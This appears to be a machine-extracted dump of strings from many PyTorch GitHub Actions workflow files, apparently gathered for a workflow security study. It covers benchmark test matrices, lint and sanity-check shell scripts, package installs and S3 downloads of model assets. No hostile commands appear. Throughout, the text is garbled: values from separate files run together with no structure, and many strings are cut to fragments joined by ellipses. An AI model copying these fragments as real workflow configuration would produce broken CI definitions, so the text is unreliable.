  { config: "inductor_timm_perf", shard: 4, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf", shard: 5, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_timm_perf", shard: 6, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 1, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 2, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 3, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 4, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 5, num_shards: 6, runner: "linux.aws.a100" },
  { config: "inductor_torchbench_perf", shard: 6, num_shards: 6, runner: "linux.aws.a100" },
  { config: "cachebench", shard: 1, num_shards: 2, runner: "linux.aws.a100" },
  { config: "cachebench", shard: 2, num_shards: 2, runner: "linux.aws.a100" },
]}
linux-focal-cuda12_6-py3_10-gcc9-inductor-test-nightlylinux-f ... nightlylinux-focal-cuda12_6-py3_10-gcc9-inductor-test-weeklylinux-f ... -weekly/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-periodic.ymlinductor-periodicciflow/inductor-periodic/*ciflow/ ... iodic/*- ciflo ... iodic/*45 0,4,8,12,16,20 * * 1-545 0,4, ... * * 1-5cron: 4 ... * * 1-545 4,12 * * 0,6cron: 4 ... * * 0,6- cron: ... * * 1-5linux-focal-cuda12_6-py3_10-gcc9-periodic-dynamo-benchmarks-buildlinux-f ... s-buildcuda12.6-py3.10-gcc9-sm86-periodic-dynamo-benchmarkscuda12. ... chmarkslinux-focal-cuda12.6-py3.10-gcc9-sm86linux-f ... c9-sm86'8.6'{ include: [
  { config: "dynamo_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamo_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamo_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamo_eager_timm", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamo_eager_timm", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_eager_timm", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_eager_timm", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_aot_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_aot_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_aot_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_aot_eager_timm", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_aot_eager_timm", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
]}
name: c ... chmarkslinux-focal-cuda12_6-py3_10-gcc9-periodic-dynamo-benchmarks-testlinux-f ... ks-test${{ needs.linux-focal-cuda12_6-py3_10-gcc9-periodic-dynamo-benchmarks-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc9-periodic-dynamo-benchmarks-build.outputs.test-matrix }}build-e ... c9-sm86linux-jammy-rocm-py3_10-periodic-dynamo-benchmarks-buildrocm-py3_10-periodic-dynamo-benchmarksrocm-py ... chmarksrocm-build{ include: [
  { config: "dynamo_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamo_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamo_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamo_eager_timm", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamo_eager_timm", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "aot_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "aot_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "aot_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.rocm.gpu.mi300.2" },
  { config: "aot_eager_timm", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "aot_eager_timm", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamic_aot_eager_torchbench", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamic_aot_eager_torchbench", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamic_aot_eager_huggingface", shard: 1, num_shards: 1, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamic_aot_eager_timm", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "dynamic_aot_eager_timm", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
]}
linux-jammy-rocm-py3_10-periodic-dynamo-benchmarks-test${{ needs.linux-jammy-rocm-py3_10-periodic-dynamo-benchmarks-build.outputs.docker-image }}${{ needs.linux-jammy-rocm-py3_10-periodic-dynamo-benchmarks-build.outputs.test-matrix }}linux-focal-cuda12_6-py3_10-gcc9-inductor-build-gcplinux-f ... ild-gcp{ include: [
  { config: "inductor_torchbench_smoketest_perf", shard: 1, num_shards: 1, runner: "linux.aws.a100" },
]}
linux-focal-cuda12_6-py3_10-gcc9-inductor-test-gcplinux-f ... est-gcp${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-build-gcp.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_10-gcc9-inductor-build-gcp.outputs.test-matrix }}linux-jammy-cpu-py3_9-gcc11-periodic-dynamo-benchmarks-buildlinux-jammy-cpu-py3.9-gcc11-periodic-dynamo-benchmarks{ include: [
  { config: "cpu_inductor_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_freezing_avx2_huggingface", shard: 1, num_shards: 1, runner: "linux.10xlarge.avx2" },
  { config: "cpu_inductor_freezing_avx2_torchbench", shard: 1, num_shards: 2, runner: "linux.10xlarge.avx2" },
  { config: "cpu_inductor_freezing_avx2_torchbench", shard: 2, num_shards: 2, runner: "linux.10xlarge.avx2" },
  { config: "cpu_inductor_freezing_avx2_timm", shard: 1, num_shards: 2, runner: "linux.10xlarge.avx2" },
  { config: "cpu_inductor_freezing_avx2_timm", shard: 2, num_shards: 2, runner: "linux.10xlarge.avx2" },
]}
linux-jammy-cpu-py3_9-gcc11-periodic-dynamo-benchmarks-test${{ needs.linux-jammy-cpu-py3_9-gcc11-periodic-dynamo-benchmarks-build.outputs.docker-image }}${{ needs.linux-jammy-cpu-py3_9-gcc11-periodic-dynamo-benchmarks-build.outputs.test-matrix }}cuda12.6-py3.10-gcc9-sm86cuda12. ... c9-sm86{ include: [
  { config: "dynamic_inductor_huggingface", shard: 1, num_shards: 1, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_inductor_timm", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_inductor_timm", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_inductor_torchbench", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "dynamic_inductor_torchbench", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_inductor_huggingface", shard: 1, num_shards: 1, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_inductor_timm", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_inductor_timm", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_inductor_torchbench", shard: 1, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
  { config: "aot_inductor_torchbench", shard: 2, num_shards: 2, runner: "linux.g5.4xlarge.nvidia.gpu" },
]}
name: c ... c9-sm86{ include: [
  { config: "cpu_inductor_freezing_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_freezing_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_freezing_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_amp_freezing_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_amp_freezing_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_amp_freezing_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_amp_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_inductor_amp_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_freezing_huggingface", shard: 1, num_shards: 1, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_freezing_timm", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_freezing_timm", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_amp_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "cpu_aot_inductor_amp_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_aot_inductor_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_aot_inductor_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_aot_inductor_amp_freezing_torchbench", shard: 1, num_shards: 2, runner: "linux.8xlarge.amx" },
  { config: "dynamic_cpu_aot_inductor_amp_freezing_torchbench", shard: 2, num_shards: 2, runner: "linux.8xlarge.amx" },
]}
name: i ... eriodic/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-rocm-mi300.ymlinductor-rocm-mi300ciflow/inductor-rocm/*target-determinationbefore-test./.github/workflows/target_determination.ymllinux-jammy-rocm-py3_10-inductor-buildrocm-py3.10-inductorlinux-jammy-rocm-py3.10{ include: [
  { config: "inductor", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
  { config: "inductor", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.mi300.2" },
]}
name: r ... nductorlinux-jammy-rocm-py3_10-inductor-test${{ needs.linux-jammy-rocm-py3_10-inductor-build.outputs.docker-image }}${{ needs.linux-jammy-rocm-py3_10-inductor-build.outputs.test-matrix }}target- ... nation:name: i ... m-mi300/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-rocm.ymlinductor-rocmciflow/inductor/*{ include: [
  { config: "inductor", shard: 1, num_shards: 2, runner: "linux.rocm.gpu.2" },
  { config: "inductor", shard: 2, num_shards: 2, runner: "linux.rocm.gpu.2" },
]}
name: inductor-rocm/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor-unittest.ymlinductor-unittest29 8 * * *cron: 2 ...  tests.- cron: ...  tests.${{ github.workflow }}-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-unittest${{ git ... nittestgroup:  ... nittest{ include: [
  { config: "inductor", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_distributed", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.12xlarge.nvidia.gpu" },
  { config: "inductor_cpp_wrapper", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_cpp_wrapper", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
]}
linux-focal-cuda12_6-py3_12-gcc9-inductor-buildcuda12.6-py3.12-gcc9-sm86linux-focal-cuda12.6-py3.12-gcc9-sm86ci-image:pytorch-linux-focal-cuda12.6-cudnn9-py3.12-gcc9-inductor-benchmarks{ include: [
  { config: "inductor", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
]}
linux-focal-cuda12_6-py3_12-gcc9-inductor-test${{ needs.linux-focal-cuda12_6-py3_12-gcc9-inductor-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_12-gcc9-inductor-build.outputs.test-matrix }}linux-jammy-cpu-py3_12-inductor-halide-buildlinux-j ... e-buildlinux-jammy-cpu-py3.12-gcc11-inductor-halidelinux-j ... -halidelinux-jammy-py3.12-gcc11linux-j ... 2-gcc11ci-image:pytorch-linux-jammy-py3.12-halideci-imag ... -halide{ include: [
  { config: "inductor-halide", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.12xlarge" },
]}
build-e ... 2-gcc11name: l ... -halidelinux-jammy-cpu-py3_12-inductor-halide-testlinux-j ... de-test${{ needs.linux-jammy-cpu-py3_12-inductor-halide-build.outputs.docker-image }}${{ needs.linux-jammy-cpu-py3_12-inductor-halide-build.outputs.test-matrix }}linux-jammy-cpu-py3_12-inductor-triton-cpu-buildlinux-j ... u-buildlinux-jammy-cpu-py3.12-gcc11-inductor-triton-cpulinux-j ... ton-cpuci-image:pytorch-linux-jammy-py3.12-triton-cpuci-imag ... ton-cpu{ include: [
  { config: "inductor-triton-cpu", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.12xlarge" },
]}
name: l ... ton-cpulinux-jammy-cpu-py3_12-inductor-triton-cpu-testlinux-j ... pu-test${{ needs.linux-jammy-cpu-py3_12-inductor-triton-cpu-build.outputs.docker-image }}${{ needs.linux-jammy-cpu-py3_12-inductor-triton-cpu-build.outputs.test-matrix }}{ include: [
  { config: "inductor_amx", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "inductor_amx", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "inductor_avx2", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.10xlarge.avx2" },
  { config: "inductor_avx2", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.10xlarge.avx2" },
]}
linux-focal-cuda12_6-py3_13-gcc9-inductor-buildcuda12.6-py3.13-gcc9-sm86linux-focal-cuda12.6-py3.13-gcc9-sm86ci-image:pytorch-linux-focal-cuda12.6-cudnn9-py3.13-gcc9-inductor-benchmarkslinux-focal-cuda12_6-py3_13-gcc9-inductor-test${{ needs.linux-focal-cuda12_6-py3_13-gcc9-inductor-build.outputs.docker-image }}${{ needs.linux-focal-cuda12_6-py3_13-gcc9-inductor-build.outputs.test-matrix }}name: i ... nittest/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__inductor.ymlinductor- ciflow/inductor/*./.github/workflows/inductor-unittest.yml{ include: [
  { config: "inductor_huggingface", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_timm", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_timm", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_torchbench", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
  { config: "inductor_torchbench", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.g5.4xlarge.nvidia.gpu" },
]}
{ include: [
  { config: "cpu_inductor_torchbench", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "cpu_inductor_torchbench", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_huggingface", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_timm", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_timm", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_torchbench", shard: 1, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "dynamic_cpu_inductor_torchbench", shard: 2, num_shards: 2, runner: "${{ needs.get-label-type.outputs.label-type }}linux.8xlarge.amx" },
  { config: "inductor_torchbench_cpu_smoketest_perf", shard: 1, num_shards: 1, runner: "${{ needs.get-label-type.outputs.label-type }}linux.24xl.spr-metal" },
]}
unit-test:name: inductor/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__lint-autoformat.ymlApply lint suggestionsApply l ... estionslintrunner-autoformatlintrun ... oformatlf.linux.2xlarge${{ github.repository_owner == 'pytorch' && contains(github.event.pull_request.labels.*.name, 'autoformat') }}${{ git ... at') }}Checkout pytorchRun lintrunner (nonretryable)Run lin ... ryable)set -ex
python3 -m venv /tmp/venv
source /tmp/venv/bin/activate
export ADDITIONAL_LINTRUNNER_ARGS="format --all-files"
bash .github/scripts/lintrunner.sh
name: R ... ryable)git-checkgit diff --exit-code || echo "changes=true" >> "$GITHUB_OUTPUT"
Suggest changessteps.git-check.outputs.changes == 'true'steps.g ...  'true'parkerbxyz/suggest-changes@a2ec1653b0c4cc8287d682f0066dba4a173cc7f3parkerb ... 73cc7f3Please commit the suggested changes from pytorch's linter."Please ... inter."comment ... inter."name: S ... changeslintrun ... format:name: A ... estions/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__lint-bc.ymlBC Lintciflow/inductor-cu126/*ciflow/ ... cu126/*-  cifl ... cu126/*bc_linterRun BC Lint Actionpytorch/test-infra/.github/actions/bc-lint@mainpytorch ... nt@main${{ github.event.pull_request.head.repo.full_name }}base_shahead_shasuppression${{ contains(github.event.pull_request.labels.*.name, 'suppress-api-compatibility-check') || contains(github.event.pull_request.labels.*.name, 'suppress-bc-linter') }}${{ con ... er') }}docs_linkhttps://github.com/pytorch/test-infra/wiki/BC-Linter'https: ... Linter'repo: $ ... name }}name: R ...  Actionbc_linter:name: BC Lint/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__lint.ymlciflow/pull/*- ciflow/pull/*lintrunner-clangci-image:pytorch-linux-jammy-cuda11.8-cudnn9-py3.9-linterci-imag ... -linterexport ADDITIONAL_LINTRUNNER_ARGS="--take CLANGTIDY,CLANGFORMAT --all-files"
export CLANG=1
.github/scripts/lintrunner.sh
uses: p ... ml@mainlintrunner-noclangexport ADDITIONAL_LINTRUNNER_ARGS="--skip CLANGTIDY,CLANGFORMAT --all-files"
.github/scripts/lintrunner.sh
quick-checksci-image:pytorch-linux-focal-linter# Ensure no non-breaking spaces
# NB: We use 'printf' below rather than '\u000a' since bash pre-4.2
# does not support the '\u000a' syntax (which is relevant for local linters)
(! git --no-pager grep -In "$(printf '\xC2\xA0')" -- . || (echo "The above lines have non-breaking spaces (U+00A0); please convert them to spaces (U+0020)"; false))

# Ensure cross-OS compatible file names
(! git ls-files | grep -E '([<>:"|?*]|[ .]$)' || (echo "The above file names are not valid across all operating systems. Please ensure they don't contain the characters '<>:""|?*' and don't end with a white space or a '.' "; false))

# Ensure no versionless Python shebangs
(! git --no-pager grep -In '#!.*python$' -- . || (echo "The above lines have versionless Python shebangs; please specify either python2 or python3"; false))

# Ensure ciflow tags mentioned in config
python3 .github/scripts/collect_ciflow_labels.py --validate-tags

# C++ docs check
pushd docs/cpp/source
./check-doxygen.sh
popd

# CUDA kernel launch check
set -eux
python3 torch/testing/_internal/check_kernel_launches.py |& tee cuda_kernel_launch_checks.txt
pr-sanity-checks[self-h ... large"]github.event_name == 'pull_request' && !contains(github.event.pull_request.labels.*.name, 'skip-pr-sanity-checks')github. ... hecks')PR size check (nonretryable)PR size ... ryable)BASEHEADBASE: $ ... .sha }}bash .github/scripts/pr-sanity-check.sh
name: P ... ryable)name: p ... -checksworkflow-checks# Regenerate workflows
.github/scripts/generate_ci_workflows.py

RC=0
# Assert that regenerating the workflows didn't change them
if ! .github/scripts/report_git_status.sh .github/workflows; then
  echo
  echo 'As shown by the above diff, the committed .github/workflows'
  echo 'are not up to date according to .github/templates.'
  echo 'Please run this command, commit, and push again to your PR:'
  echo
  echo '    .github/scripts/generate_ci_workflows.py'
  echo
  echo 'If running that command does nothing, you may need to rebase'
  echo 'onto a more recent commit from the PyTorch main branch.'
  RC=1
fi

# Check that jobs will be cancelled
.github/scripts/ensure_actions_will_cancel.py

exit $RC
toc# Regenerate ToCs and check that they didn't change
set -eu

export PATH=~/.npm-global/bin:"$PATH"
for FILE in $(git grep -Il '<!-- toc -->' -- '**.md'); do
  markdown-toc --bullets='-' -i "$FILE"
done

if ! .github/scripts/report_git_status.sh .; then
  echo
  echo 'As shown by the above diff, the table of contents in one or'
  echo 'more Markdown files is not up to date with the file contents.'
  echo 'You can either apply that Git diff directly to correct the'
  echo 'table of contents, or if you have npm installed, you can'
  echo 'install the npm package markdown-toc and run the following'
  # shellcheck disable=SC2016
  echo 'command (replacing $FILE with the filename for which you want'
  echo 'to regenerate the table of contents):'
  echo
  # shellcheck disable=SC2016
  echo "    markdown-toc --bullets='-' -i \"\$FILE\""
  false
fi
test-toolsTest tools# Test tools
PYTHONPATH=$(pwd) pytest tools/stats
PYTHONPATH=$(pwd) pytest tools/test -o "python_files=test*.py"
PYTHONPATH=$(pwd) pytest .github/scripts -o "python_files=test*.py"
name: Test toolstest_run_testTest `run_test.py` is usable without boto3Test `r ... t boto3Setup Python 3.9name: S ... hon 3.9python3 -m pip install --upgrade pip
pip install pytest-rerunfailures==11.1.* pytest-flakefinder==1.1.* pytest-xdist==3.3.* expecttest==0.3.* fbscribelogger==0.1.* numpy==1.24.*
pip install torch --pre --index-url https://download.pytorch.org/whl/nightly/cpu/
Run run_test.py (nonretryable)Run run ... ryable)# Run test_vulkan, which is a fast noop on Linux
python3 test/run_test.py --include test_vulkan --verbose
name: T ... t boto3test_collect_envTest collect_envtest_typewith_torchtest_ty ... h_torchwithout_torchtest_ty ... t_torcholder_python_versiontest_ty ... version- test_ ... h_torchGet min python versionGet min ... versionget-min-python-versionget-min ... versionmatrix.test_type == 'older_python_version'matrix. ... ersion'set -eou pipefail
# Generate PyTorch version to use
echo "MIN_PYTHON_VERSION=$(python3 .github/scripts/get_ci_variable.py --min-python-version)" >> "${GITHUB_OUTPUT}"
Setup Old Python versionSetup O ... version**/requirements.txt
Setup Min Python versionSetup M ... versionmatrix.test_type != 'older_python_version'${{ steps.get-min-python-version.outputs.MIN_PYTHON_VERSION }}python- ... SION }}Install torchmatrix.test_type == 'with_torch'matrix. ... _torch'pip install -r requirements.txt
# Doesn't really matter what torch version, we just need ANY torch installed
pip install 'torch==2.*'
name: Install torchRun collect_env.py (nonretryable)Run col ... ryable)# All we need to see is that it passes
python3 torch/utils/collect_env.py
/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__linux-aarch64.ymllinux-aarch64ciflow/linux-aarch64/*ciflow/ ... rch64/*- ciflo ... rch64/*${{ github.workflow }}-${{ github.event.pull_request.number || github.sha }}-${{ github.event_name == 'workflow_dispatch' }} but found ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref_name }}-${{ github.ref_type == 'branch' && github.sha }}-${{ github.event_name == 'workflow_dispatch' }}-${{ github.event_name == 'schedule' }}linux-jammy-aarch64-py3_10-buildlinux-j ... 0-build${{ nee ... type }}ci-image:pytorch-linux-jammy-aarch64-py3.10-gcc11ci-imag ... 0-gcc11{ include: [
  { config: "default", shard: 1, num_shards: 4, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.2xlarge" },
  { config: "default", shard: 2, num_shards: 4, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.2xlarge" },
  { config: "default", shard: 3, num_shards: 4, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.2xlarge" },
  { config: "default", shard: 4, num_shards: 4, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.2xlarge" },
  { config: "default", shard: 1, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.m7g.4xlarge" },
  { config: "default", shard: 2, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.m7g.4xlarge" },
  { config: "default", shard: 3, num_shards: 3, runner: "${{ needs.get-label-type.outputs.label-type }}linux.arm64.m7g.4xlarge" },
]}
runner_ ... type }}name: l ... -py3.10linux-jammy-aarch64-py3_10-testlinux-j ... 10-test${{ needs.linux-jammy-aarch64-py3_10-build.outputs.docker-image }}${{ needs.linux-jammy-aarch64-py3_10-build.outputs.test-matrix }}name: linux-aarch64/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__llm_td_retrieval.ymlRetrieval PyTorch Tests for Target DeterminationRetriev ... inationllm-retrievalClone PyTorchpytorch/pytorchreposit ... pytorchname: Clone PyTorch./pytorch/.github/actions/setup-linux./pytor ... p-linuxClone CodeLlamaosalpekar/codellamacodellamareposit ... dellamaname: C ... deLlamaClone Target Determination CodeClone T ... on Codeosalpekar/llm-target-determinatorosalpek ... minatorv0.0.2llm-target-determinatorllm-tar ... minatorreposit ... minatorname: C ... on Codeset -euxo pipefail
python3 -m pip install -r llm-target-determinator/requirements.txt
cd "${GITHUB_WORKSPACE}/codellama"
python3 -m pip install -e .
Fetch CodeLlama CheckpointFetch C ... ckpointset -euxo pipefail
cd "${GITHUB_WORKSPACE}/codellama"
mkdir "CodeLlama-7b-Python"
aws s3 cp "s3://target-determinator-assets/CodeLlama-7b-Python" "CodeLlama-7b-Python" --recursive --no-progress
name: F ... ckpointFetch indexesset -euxo pipefail
python3 -m pip install awscli==1.29.40
cd "${GITHUB_WORKSPACE}"/llm-target-determinator/assets
aws s3 cp "s3://target-determinator-assets/indexes/latest" . --recursive

unzip -o indexer-files\*.zip
rm indexer-files*.zip
max_attempts: 3name: Fetch indexesRun Retrieverrun_retrieverset -euxo pipefail
cd "${GITHUB_WORKSPACE}"/llm-target-determinator
export PATH="$HOME/.local/bin:$PATH"
torchrun \
  --standalone \
  --nnodes=1 \
  --nproc-per-node=1 \
  retriever.py \
  --experiment-name indexer-files \
  --pr-parse-format GITDIFF
cd assets
zip -r mappings.zip mappings
name: Run RetrieverUpload results to s3${{ steps.run_retriever.outcome == 'success' }}${{ ste ... ess' }}llm_resultsllm-target-determinator/assets/mappings.zipllm-tar ... ngs.zipname: llm_resultsAWS_SESSION_TOKENAWS_REGIONAWS_ACC ... _ID: ""name: R ... ination/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch__mac-mps.ymlMac MPSciflow/mps/*- ciflow/mps/*macos-py3-arm64-buildmacos-py3-arm64{ include: [
  { config: "test_mps", shard: 1, num_shards: 1, runner: "macos-m1-13" },
  { config: "test_mps", shard: 1, num_shards: 1, runner: "macos-m1-14" },
  { config: "test_mps", shard: 1, num_shards: 1, runner: "macos-m2-15" },
]}
